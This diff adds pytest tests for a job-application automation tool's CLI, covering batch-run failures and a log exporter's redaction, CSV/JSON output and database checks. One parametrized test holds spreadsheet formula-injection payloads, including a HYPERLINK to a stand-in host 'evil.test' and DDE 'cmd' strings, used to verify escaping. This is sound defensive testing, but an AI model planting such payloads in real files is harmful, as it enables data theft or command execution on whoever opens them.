+            settings=harness.settings,
+            worker_factory=self._worker_factory(harness, LockedWorker),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert ".job-apply-lock.json" in console.text
+        assert "Traceback" not in console.text
+
+    def test_a_teardown_that_also_fails_is_reported_not_raised(
+        self, harness: Harness
+    ) -> None:
+        """Two failures at once must still leave the CLI with something to say."""
+
+        class DoublyBroken(ApplicationWorker):
+            async def start(self) -> None:
+                await super().start()
+                raise RuntimeError("the checkpointer could not be opened")
+
+            async def stop(self) -> None:
+                await super().stop()
+                raise RuntimeError("the profile lock could not be released")
+
+        console = Console()
+
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=self._worker_factory(harness, DoublyBroken),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert "could not be started" in console.text
+        assert "profile lock could not be released" in console.text
+
+    def test_nothing_is_queued_when_the_worker_never_starts(
+        self, harness: Harness
+    ) -> None:
+        """A listing queued against a worker that never ran is a lie.
+
+        The row would sit `pending` with nothing to claim it, and the
+        operator would be told the batch failed while the queue said the
+        opposite.
+        """
+
+        class LockedWorker(ApplicationWorker):
+            async def start(self) -> None:
+                raise ProfileLockedError(Path("/tmp/x/.job-apply-lock.json"), None, True)
+
+        run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=self._worker_factory(harness, LockedWorker),
+            client_factory=_no_http,
+            writer=lambda line: None,
+        )
+
+        assert harness.db.list_queue_items() == []
+
+    def test_the_browser_is_closed_even_when_a_run_fails(
+        self, harness: Harness
+    ) -> None:
+        class Exploding(ApplicationWorker):
+            async def drain(self) -> Any:
+                raise RuntimeError("the queue could not be drained")
+
+        def factory(settings: Settings) -> ApplicationWorker:
+            worker = Exploding(
+                settings,
+                db=harness.world.db,
+                session_factory=harness.session_factory,
+                dependencies_factory=lambda _s, _d, _c: harness.world.deps,
+                checkpointer_path=harness.world.checkpoint_path,
+                run_loop=False,
+            )
+            harness.workers.append(worker)
+            return worker
+
+        console = Console()
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=factory,
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert harness.sessions[0].closes == 1
+
+
+def _no_http(api_url: str, token: str | None) -> AbstractContextManager[httpx.Client]:
+    raise AssertionError("a local run must not open an HTTP client")
+
+
+class TestExportLog:
+    """The exporter reads storage directly; values stay redacted by default."""
+
+    @pytest.fixture
+    def exported(self, tmp_path: Path) -> Settings:
+        settings = Settings(
+            _env_file=None,
+            sqlite_path=tmp_path / "jobs.db",
+            artifacts_path=tmp_path / "artifacts",
+        )
+        from app.storage.db import Database
+
+        db = Database(settings)
+        db.initialize()
+        queue_id = db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        application_id = db.create_application(
+            queue_id=queue_id,
+            thread_id=thread_id_for(queue_id),
+            status=ApplicationStatus.SUBMITTED,
+            ats="greenhouse",
+            trigger_tier=1,
+            model_cost=0.25,
+        )
+        db.save_application_field(
+            application_id=application_id,
+            stable_key="frame|input|email",
+            source=FieldSource.JOBRIGHT,
+            required=True,
+            filled=True,
+            value="ada@example.com",
+            metadata={"label": "Email"},
+        )
+        db.record_approval(
+            application_id=application_id,
+            decision=ApprovalDecision.APPROVED,
+            actor="ada@example.com",
+            note="applied",
+        )
+        return settings
+
+    def test_json_export_describes_each_application(
+        self, exported: Settings
+    ) -> None:
+        console = Console()
+
+        code = export_log.main(
+            ["--format", "json"], settings=exported, writer=console.write
+        )
+
+        assert code == 0
+        payload = console.json()
+        entry = payload["applications"][0]
+        assert entry["listing_url"] == LISTING_URL
+        assert entry["board"] == "linkedin"
+        assert entry["status"] == "submitted"
+        assert entry["ats"] == "greenhouse"
+        assert entry["decision"] == "approved"
+        assert entry["actor"] == "ada@example.com"
+
+    def test_csv_export_has_one_row_per_application(
+        self, exported: Settings
+    ) -> None:
+        console = Console()
+
+        export_log.main(["--format", "csv"], settings=exported, writer=console.write)
+
+        rows = list(csv.DictReader(console.text.splitlines()))
+        assert len(rows) == 1
+        assert rows[0]["listing_url"] == LISTING_URL
+        assert rows[0]["model_cost"] == "0.25"
+
+    def test_field_rows_carry_provenance(self, exported: Settings) -> None:
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields"], settings=exported, writer=console.write
+        )
+
+        rows = list(csv.DictReader(console.text.splitlines()))
+        assert rows[0]["stable_key"] == "frame|input|email"
+        assert rows[0]["source"] == "jobright"
+
+    def test_a_stored_value_is_redacted_by_default(
+        self, exported: Settings
+    ) -> None:
+        """The row was written while logging was on; the export refuses it."""
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--fields"], settings=exported, writer=console.write
+        )
+
+        assert console.json()["applications"][0]["fields"][0]["value"] is None
+        assert "ada@example.com" not in console.text.replace(
+            '"actor": "ada@example.com"', ""
+        )
+
+    def test_values_need_both_the_flag_and_the_setting(
+        self, exported: Settings
+    ) -> None:
+        console = Console()
+
+        code = export_log.main(
+            ["--format", "json", "--fields", "--include-values"],
+            settings=exported,
+            writer=console.write,
+        )
+
+        assert code == 0
+        assert console.json()["applications"][0]["fields"][0]["value"] is None
+
+    def test_a_flag_that_did_nothing_says_so_without_spoiling_the_output(
+        self, exported: Settings, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        """Silence here reads as "there were no values", which is a lie.
+
+        The notice goes to stderr rather than through the writer so that a
+        JSON export stays a parseable JSON document when it is piped.
+        """
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--fields", "--include-values"],
+            settings=exported,
+            writer=console.write,
+        )
+
+        assert "had no effect" in capsys.readouterr().err
+        assert console.json()["applications"] != []
+
+    def test_values_are_exported_when_logging_is_enabled(
+        self, exported: Settings
+    ) -> None:
+        enabled = exported.model_copy(update={"log_field_values": True})
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--fields", "--include-values"],
+            settings=enabled,
+            writer=console.write,
+        )
+
+        assert (
+            console.json()["applications"][0]["fields"][0]["value"]
+            == "ada@example.com"
+        )
+
+    def test_an_export_can_be_narrowed_by_status(self, exported: Settings) -> None:
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--status", "failed"],
+            settings=exported,
+            writer=console.write,
+        )
+
+        assert console.json()["applications"] == []
+
+    def test_an_export_can_be_written_to_a_file(
+        self, exported: Settings, tmp_path: Path
+    ) -> None:
+        target = tmp_path / "export.json"
+
+        code = export_log.main(
+            ["--format", "json", "--output", str(target)], settings=exported
+        )
+
+        assert code == 0
+        assert json.loads(target.read_text())["applications"][0]["board"] == "linkedin"
+
+    def test_a_database_that_is_not_there_is_reported_not_created(
+        self, tmp_path: Path
+    ) -> None:
+        """A mistyped path must not read as "you have no applications".
+
+        `Database.initialize()` creates what it opens, so exporting from a
+        path with a typo in it used to print a valid, empty export — the
+        one answer an operator has no way to tell from the truth. It also
+        left a stray empty database behind.
+        """
+        missing = tmp_path / "not-here.db"
+        console = Console()
+
+        code = export_log.main(
+            ["--format", "json"],
+            settings=Settings(
+                _env_file=None,
+                sqlite_path=missing,
+                artifacts_path=tmp_path / "artifacts",
+            ),
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert str(missing) in console.text
+        assert not missing.exists()
+
+    def test_an_unwritable_output_path_is_reported_not_raised(
+        self, exported: Settings, tmp_path: Path
+    ) -> None:
+        console = Console()
+
+        code = export_log.main(
+            ["--format", "json", "--output", str(tmp_path / "missing" / "x.json")],
+            settings=exported,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert "could not be written" in console.text
+
+    @pytest.mark.parametrize(
+        "label",
+        [
+            "=HYPERLINK(\"http://evil.test?\"&A1,\"click\")",
+            "+1+cmd|' /C calc'!A0",
+            "-2+3+cmd|' /C calc'!A0",
+            "@SUM(1+9)*cmd|' /C calc'!A0",
+            "\tleading tab",
+            "\rleading carriage return",
+        ],
+    )
+    def test_a_dangerous_label_cannot_become_a_spreadsheet_formula(
+        self, tmp_path: Path, label: str
+    ) -> None:
+        """Field labels come from the page, and the page is not ours.
+
+        A CSV cell beginning with `=`, `+`, `-`, `@`, a tab, or a carriage
+        return is executed as a formula by Excel and LibreOffice when the
+        file is opened. The label of a question on someone's application
+        form is attacker-controlled text on a hostile listing, and the
+        operator opening their own export is exactly the person with the
+        access worth stealing.
+        """
+        settings = self._database_with_field(tmp_path, label=label, value="Ada")
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields"], settings=settings, writer=console.write
+        )
+
+        # Parsed as a CSV document rather than by splitting lines: a cell
+        # holding a carriage return is quoted, and splitting would tear it.
+        row = _csv_rows(console.text)[0]
+        assert row["label"] == "'" + label
+
+    def test_a_dangerous_answer_is_escaped_when_values_are_exported(
+        self, tmp_path: Path
+    ) -> None:
+        """Answers are typed by a model or a human; neither is a formula."""
+        settings = self._database_with_field(
+            tmp_path, label="Phone", value="=1+1"
+        ).model_copy(update={"log_field_values": True})
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields", "--include-values"],
+            settings=settings,
+            writer=console.write,
+        )
+
+        row = list(csv.DictReader(console.text.splitlines()))[0]
+        assert row["value"] == "'=1+1"
+
+    def test_an_ordinary_cell_is_left_exactly_as_it_is(
+        self, exported: Settings
+    ) -> None:
+        """Escaping everything would make every export wrong instead."""
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields"], settings=exported, writer=console.write
+        )
+
+        row = list(csv.DictReader(console.text.splitlines()))[0]
+        assert row["listing_url"] == LISTING_URL
+        assert row["label"] == "Email"
+        assert row["model_cost"] == "0.25"
+        assert row["stable_key"] == "frame|input|email"
+
+    def test_json_export_does_not_escape_anything(self, tmp_path: Path) -> None:
+        """The quote is a spreadsheet convention, and JSON is not one.
+
+        Adding it there would corrupt the value for every program that
+        reads JSON properly, to defend against a risk JSON does not have.
+        """
+        settings = self._database_with_field(tmp_path, label="=1+1", value="Ada")
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--fields"], settings=settings, writer=console.write
+        )
+
+        assert console.json()["applications"][0]["fields"][0]["label"] == "=1+1"
+
+    def _database_with_field(
+        self, tmp_path: Path, *, label: str, value: str
+    ) -> Settings:
+        settings = Settings(
+            _env_file=None,
+            sqlite_path=tmp_path / "jobs.db",
+            artifacts_path=tmp_path / "artifacts",
+        )
+        from app.storage.db import Database
+
+        db = Database(settings)
+        db.initialize()
+        queue_id = db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        application_id = db.create_application(
+            queue_id=queue_id,
+            thread_id=thread_id_for(queue_id),
+            status=ApplicationStatus.AWAITING_APPROVAL,
+        )
+        db.save_application_field(
+            application_id=application_id,
+            stable_key="frame|input|q",
+            source=FieldSource.LLM,
+            required=True,
+            filled=True,
+            value=value,
+            metadata={"label": label},
+        )
+        return settings
+
+    def test_the_export_leaves_the_database_byte_for_byte_alone(
+        self, exported: Settings
+    ) -> None:
+        """Reading a log must not be a way to alter or migrate it.
+
+        The export used to call `initialize()`, which opens the database
+        for writing and applies every schema statement — a read command
+        that could rewrite the thing being read, and that turned a mistyped
+        path into a new empty database.
+        """
+        before = exported.sqlite_path.read_bytes()
+
+        code = export_log.main(
+            ["--format", "json"], settings=exported, writer=lambda line: None
+        )
+
+        assert code == 0
+        assert exported.sqlite_path.read_bytes() == before
+        assert not (exported.sqlite_path.parent / "jobs.db-journal").exists()
+
+    @pytest.mark.skipif(
+        os.geteuid() == 0, reason="root ignores the write bit this test removes"
+    )
+    def test_a_write_protected_database_can_still_be_exported(
+        self, exported: Settings
+    ) -> None:
+        """A backup on read-only media is a normal thing to export from."""
+        exported.sqlite_path.chmod(0o444)
+        console = Console()
+        try:
+            code = export_log.main(
+                ["--format", "json"], settings=exported, writer=console.write
+            )
+        finally:
+            exported.sqlite_path.chmod(0o644)
+
+        assert code == 0
+        assert console.json()["applications"][0]["listing_url"] == LISTING_URL
+
+    def test_a_file_that_is_not_a_database_is_reported_plainly(
+        self, tmp_path: Path
+    ) -> None:
+        path = tmp_path / "jobs.db"
+        path.write_text("this is a shopping list, not a database\n")
+        settings = Settings(
+            _env_file=None, sqlite_path=path, artifacts_path=tmp_path / "artifacts"
+        )
+        console = Console()
+
+        code = export_log.main([], settings=settings, writer=console.write)
+
+        assert code == 1
+        assert str(path) in console.text
+        assert "not a SQLite database" in console.text
+        assert "Traceback" not in console.text
+
+    def test_a_database_without_the_log_tables_is_reported_plainly(
+        self, tmp_path: Path
+    ) -> None:
+        """Someone else's SQLite file, or a path that once held one."""
+        path = tmp_path / "jobs.db"
+        conn = sqlite3.connect(path)
+        conn.execute("CREATE TABLE recipes (name TEXT)")
+        conn.commit()
+        conn.close()
+        settings = Settings(
+            _env_file=None, sqlite_path=path, artifacts_path=tmp_path / "artifacts"
+        )
+        console = Console()
+
+        code = export_log.main([], settings=settings, writer=console.write)
+
+        assert code == 1
+        assert str(path) in console.text
+        assert "no such table" in console.text.lower()
+        assert "SQLITE_PATH" in console.text
+
+    def test_an_unknown_status_is_a_usage_error(self, exported: Settings) -> None:
+        with pytest.raises(SystemExit):
+            export_log.build_parser().parse_args(["--status", "nonsense"])
